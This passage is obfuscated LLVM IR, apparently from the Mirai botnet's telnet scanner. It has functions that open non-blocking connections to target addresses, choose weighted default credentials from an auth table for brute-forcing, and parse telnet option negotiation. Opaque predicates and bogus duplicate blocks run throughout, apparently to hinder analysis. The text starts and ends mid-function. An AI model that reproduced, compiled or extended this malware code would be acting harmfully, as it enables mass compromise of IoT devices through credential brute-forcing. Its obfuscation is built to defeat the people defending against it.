originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = call i32 @socket(i32 2, i32 1, i32 0) #7
  %43 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %44 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %43, i32 0, i32 2
  store i32 %42, i32* %44, align 8
  %45 = icmp eq i32 %42, -1
  %46 = load i32, i32* @x.13
  %47 = load i32, i32* @y.14
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %55

; <label>:54:                                     ; preds = %originalBBpart24
  br label %119

; <label>:55:                                     ; preds = %originalBBpart24
  %56 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %57 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %56, i32 0, i32 1
  %58 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %57, i32 0, i32 1
  %59 = load i32, i32* %58, align 4
  %60 = icmp ugt i32 %59, -1
  br i1 %60, label %61, label %81

; <label>:61:                                     ; preds = %55
  %62 = load i32, i32* @x.13
  %63 = load i32, i32* @y.14
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %61
  %70 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %70, i32 0, i32 1
  %72 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %71, i32 0, i32 1
  store i32 -1, i32* %72, align 4
  %73 = load i32, i32* @x.13
  %74 = load i32, i32* @y.14
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %81

; <label>:81:                                     ; preds = %originalBBpart28, %55
  %82 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %83 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %82, i32 0, i32 4
  store i32 0, i32* %83, align 8
  %84 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %85 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %84, i32 0, i32 7
  %86 = getelementptr inbounds [8192 x i8], [8192 x i8]* %85, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %86, i8 0, i64 8192, i32 4, i1 false)
  %87 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i32 0, i32 2
  %89 = load i32, i32* %88, align 8
  %90 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %91 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %90, i32 0, i32 2
  %92 = load i32, i32* %91, align 8
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i32 0)
  %94 = or i32 2048, %93
  %95 = call i32 (i32, i32, ...) @fcntl(i32 %89, i32 4, i32 %94)
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %96, align 4
  %97 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %98 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %97, i32 0, i32 15
  %99 = load i32, i32* %98, align 4
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %101 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %100, i32 0, i32 0
  store i32 %99, i32* %101, align 4
  %102 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %103 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %102, i32 0, i32 13
  %104 = load i16, i16* %103, align 8
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  %106 = load i32, i32* @fake_time, align 4
  %107 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %108 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %107, i32 0, i32 3
  store i32 %106, i32* %108, align 4
  %109 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %110 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %109, i32 0, i32 16
  store i32 1, i32* %110, align 8
  %111 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %112 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %111, i32 0, i32 2
  %113 = load i32, i32* %112, align 8
  %114 = bitcast %union.__SOCKADDR_ARG* %4 to %struct.sockaddr**
  %115 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %115, %struct.sockaddr** %114, align 8
  %116 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %4, i32 0, i32 0
  %117 = load %struct.sockaddr*, %struct.sockaddr** %116, align 8
  %118 = call i32 @connect(i32 %113, %struct.sockaddr* %117, i32 16)
  br label %119

; <label>:119:                                    ; preds = %81, %54
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %120 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %121 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %120, i32 0, i32 2
  %122 = load i32, i32* %121, align 8
  %123 = call i32 @close(i32 %122)
  %124 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %124, i32 0, i32 2
  store i32 -1, i32* %125, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %126 = call i32 @socket(i32 2, i32 1, i32 0) #7
  %127 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %128 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %127, i32 0, i32 2
  store i32 %126, i32* %128, align 8
  %129 = icmp eq i32 %126, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %61
  %130 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %131 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %130, i32 0, i32 1
  %132 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %131, i32 0, i32 1
  store i32 -1, i32* %132, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define void @fdclose(%struct.scanner_connection*, i32) #0 {
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %6 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %5, i32 0, i32 8
  %7 = getelementptr inbounds [16 x i8], [16 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 16, i32 4, i1 false)
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 1
  %10 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %9, i32 0, i32 0
  store i32 0, i32* %10, align 8
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 12
  store i8 0, i8* %12, align 1
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 9
  store i8 0, i8* %14, align 4
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 1
  %17 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %16, i32 0, i32 1
  store i32 -1, i32* %17, align 4
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 5
  store i32 0, i32* %19, align 4
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 6
  store i32 0, i32* %21, align 8
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 2
  %24 = load i32, i32* %23, align 8
  %25 = icmp ne i32 %24, -1
  br i1 %25, label %26, label %31

; <label>:26:                                     ; preds = %2
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 2
  %29 = load i32, i32* %28, align 8
  %30 = call i32 @close(i32 %29)
  br label %31

; <label>:31:                                     ; preds = %26, %2
  %32 = load i32, i32* @x.15
  %33 = load i32, i32* @y.16
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %31
  %40 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %41 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %40, i32 0, i32 2
  store i32 -1, i32* %41, align 8
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 16
  store i32 0, i32* %43, align 8
  %44 = load i32, i32* @x.15
  %45 = load i32, i32* @y.16
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %31
  %52 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %53 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %52, i32 0, i32 2
  store i32 -1, i32* %53, align 8
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %55 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i32 0, i32 16
  store i32 0, i32* %55, align 8
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = load i32, i32* @x.17
  %2 = load i32, i32* @y.18
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca %struct.scanner_auth*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i16, align 2
  %12 = call i32 @rand_next()
  %13 = load i16, i16* @auth_table_max_weight, align 2
  %14 = zext i16 %13 to i32
  %15 = urem i32 %12, %14
  %16 = trunc i32 %15 to i16
  store i16 %16, i16* %11, align 2
  store i32 0, i32* %10, align 4
  %17 = load i32, i32* @x.17
  %18 = load i32, i32* @y.18
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %91, %originalBBpart2
  %26 = load i32, i32* %10, align 4
  %27 = load i32, i32* @auth_table_len, align 4
  %28 = icmp slt i32 %26, %27
  br i1 %28, label %29, label %94

; <label>:29:                                     ; preds = %25
  %30 = load i16, i16* %11, align 2
  %31 = zext i16 %30 to i32
  %32 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %33 = load i32, i32* %10, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 %34
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %35, i32 0, i32 2
  %37 = load i16, i16* %36, align 8
  %38 = zext i16 %37 to i32
  %39 = icmp slt i32 %31, %38
  br i1 %39, label %40, label %57

; <label>:40:                                     ; preds = %29
  %41 = load i32, i32* @x.17
  %42 = load i32, i32* @y.18
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB2, label %originalBB2alteredBB

originalBB2:                                      ; preds = %originalBB2alteredBB, %40
  %49 = load i32, i32* @x.17
  %50 = load i32, i32* @y.18
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart24, label %originalBB2alteredBB

originalBBpart24:                                 ; preds = %originalBB2
  br label %91

; <label>:57:                                     ; preds = %29
  %58 = load i16, i16* %11, align 2
  %59 = zext i16 %58 to i32
  %60 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %61 = load i32, i32* %10, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i64 %62
  %64 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %63, i32 0, i32 3
  %65 = load i16, i16* %64, align 2
  %66 = zext i16 %65 to i32
  %67 = icmp slt i32 %59, %66
  br i1 %67, label %68, label %73

; <label>:68:                                     ; preds = %57
  %69 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %70 = load i32, i32* %10, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %69, i64 %71
  store %struct.scanner_auth* %72, %struct.scanner_auth** %9, align 8
  br label %95

; <label>:73:                                     ; preds = %57
  %74 = load i32, i32* @x.17
  %75 = load i32, i32* @y.18
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i32, i32* @x.17
  %83 = load i32, i32* @y.18
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %90

; <label>:90:                                     ; preds = %originalBBpart28
  br label %91

; <label>:91:                                     ; preds = %90, %originalBBpart24
  %92 = load i32, i32* %10, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %10, align 4
  br label %25

; <label>:94:                                     ; preds = %25
  store %struct.scanner_auth* null, %struct.scanner_auth** %9, align 8
  br label %95

; <label>:95:                                     ; preds = %94, %68
  %96 = load i32, i32* @x.17
  %97 = load i32, i32* @y.18
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %95
  %104 = load %struct.scanner_auth*, %struct.scanner_auth** %9, align 8
  %105 = load i32, i32* @x.17
  %106 = load i32, i32* @y.18
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret %struct.scanner_auth* %104

originalBBalteredBB:                              ; preds = %originalBB, %0
  %113 = alloca %struct.scanner_auth*, align 8
  %114 = alloca i32, align 4
  %115 = alloca i16, align 2
  %116 = call i32 @rand_next()
  %117 = load i16, i16* @auth_table_max_weight, align 2
  %118 = zext i16 %117 to i32
  %_ = sub i32 %116, %118
  %gen = mul i32 %_, %118
  %_1 = shl i32 %116, %118
  %119 = urem i32 %116, %118
  %120 = trunc i32 %119 to i16
  store i16 %120, i16* %115, align 2
  store i32 0, i32* %114, align 4
  br label %originalBB

originalBB2alteredBB:                             ; preds = %originalBB2, %40
  br label %originalBB2

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %95
  %121 = load %struct.scanner_auth*, %struct.scanner_auth** %9, align 8
  br label %originalBB10
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %59

; <label>:20:                                     ; preds = %4
  %21 = load i32, i32* @x.19
  %22 = load i32, i32* @y.20
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %20
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  %29 = load i32, i32* @x.19
  %30 = load i32, i32* @y.20
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %37

; <label>:37:                                     ; preds = %55, %originalBBpart2
  %38 = load i32, i32* %10, align 4
  %39 = load i32, i32* %9, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %58

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %6, align 8
  %43 = load i32, i32* %10, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %49, label %54

; <label>:49:                                     ; preds = %41
  %50 = load i8*, i8** %6, align 8
  %51 = load i32, i32* %10, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  store i8 65, i8* %53, align 1
  br label %54

; <label>:54:                                     ; preds = %49, %41
  br label %55

; <label>:55:                                     ; preds = %54
  %56 = load i32, i32* %10, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %10, align 4
  br label %37

; <label>:58:                                     ; preds = %37
  br label %59

; <label>:59:                                     ; preds = %58, %4
  %60 = load i32, i32* @x.19
  %61 = load i32, i32* @y.20
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %59
  %68 = load i32, i32* %9, align 4
  %69 = load i32, i32* @x.19
  %70 = load i32, i32* @y.20
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %68

originalBBalteredBB:                              ; preds = %originalBB, %20
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %59
  %77 = load i32, i32* %9, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = load i32, i32* @x.21
  %3 = load i32, i32* @y.22
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca %struct.scanner_connection*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca [3 x i8], align 1
  %15 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %10, align 8
  store i32 0, i32* %11, align 4
  %16 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %17 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %16, i32 0, i32 7
  %18 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i32 0, i32 0
  store i8* %18, i8** %12, align 8
  %19 = load i32, i32* @x.21
  %20 = load i32, i32* @y.22
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %344, %originalBBpart221, %originalBBpart2
  %28 = load i32, i32* %11, align 4
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 4
  %31 = load i32, i32* %30, align 8
  %32 = icmp slt i32 %28, %31
  br i1 %32, label %33, label %345

; <label>:33:                                     ; preds = %27
  %34 = load i32, i32* @x.21
  %35 = load i32, i32* @y.22
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i8*, i8** %12, align 8
  %43 = load i8, i8* %42, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp ne i32 %44, 255
  %46 = load i32, i32* @x.21
  %47 = load i32, i32* @y.22
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %55

; <label>:54:                                     ; preds = %originalBBpart24
  br label %345

; <label>:55:                                     ; preds = %originalBBpart24
  %56 = load i8*, i8** %12, align 8
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 255
  br i1 %59, label %60, label %343

; <label>:60:                                     ; preds = %55
  %61 = load i32, i32* @x.21
  %62 = load i32, i32* @y.22
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %60
  %69 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %70 = load i8*, i8** %12, align 8
  %71 = call signext i8 @can_consume(%struct.scanner_connection* %69, i8* %70, i32 1)
  %72 = icmp ne i8 %71, 0
  %73 = load i32, i32* @x.21
  %74 = load i32, i32* @y.22
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %72, label %82, label %81

; <label>:81:                                     ; preds = %originalBBpart28
  br label %345

; <label>:82:                                     ; preds = %originalBBpart28
  %83 = load i8*, i8** %12, align 8
  %84 = getelementptr inbounds i8, i8* %83, i64 1
  %85 = load i8, i8* %84, align 1
  %86 = zext i8 %85 to i32
  %87 = icmp eq i32 %86, 255
  br i1 %87, label %88, label %109

; <label>:88:                                     ; preds = %82
  %89 = load i32, i32* @x.21
  %90 = load i32, i32* @y.22
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %88
  %97 = load i8*, i8** %12, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 2
  store i8* %98, i8** %12, align 8
  %99 = load i32, i32* %11, align 4
  %100 = add nsw i32 %99, 2
  store i32 %100, i32* %11, align 4
  %101 = load i32, i32* @x.21
  %102 = load i32, i32* @y.22
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart221, label %originalBB10alteredBB

originalBBpart221:                                ; preds = %originalBB10
  br label %27

; <label>:109:                                    ; preds = %82
  %110 = load i8*, i8** %12, align 8
  %111 = getelementptr inbounds i8, i8* %110, i64 1
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 253
  br i1 %114, label %115, label %177

; <label>:115:                                    ; preds = %109
  %116 = load i32, i32* @x.21
  %117 = load i32, i32* @y.22
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %115
  %124 = bitcast [3 x i8]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %124, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %125 = bitcast [9 x i8]* %15 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %125, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %126 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %127 = load i8*, i8** %12, align 8
  %128 = call signext i8 @can_consume(%struct.scanner_connection* %126, i8* %127, i32 2)
  %129 = icmp ne i8 %128, 0
  %130 = load i32, i32* @x.21
  %131 = load i32, i32* @y.22
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br i1 %129, label %139, label %138

; <label>:138:                                    ; preds = %originalBBpart225
  br label %345

; <label>:139:                                    ; preds = %originalBBpart225
  %140 = load i8*, i8** %12, align 8
  %141 = getelementptr inbounds i8, i8* %140, i64 2
  %142 = load i8, i8* %141, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp ne i32 %143, 31
  br i1 %144, label %145, label %146

; <label>:145:                                    ; preds = %139
  br label %194

; <label>:146:                                    ; preds = %139
  %147 = load i32, i32* @x.21
